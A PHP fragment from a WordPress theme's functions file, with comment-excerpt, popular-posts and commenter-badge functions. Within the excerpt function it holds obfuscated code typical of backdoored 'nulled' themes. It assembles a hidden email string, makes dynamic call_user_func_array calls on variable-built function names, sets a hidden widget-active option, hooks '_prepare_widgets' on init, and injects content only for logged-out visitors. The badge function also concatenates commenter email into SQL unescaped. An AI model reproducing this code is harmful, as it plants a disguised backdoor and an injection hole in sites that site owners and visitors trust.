	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>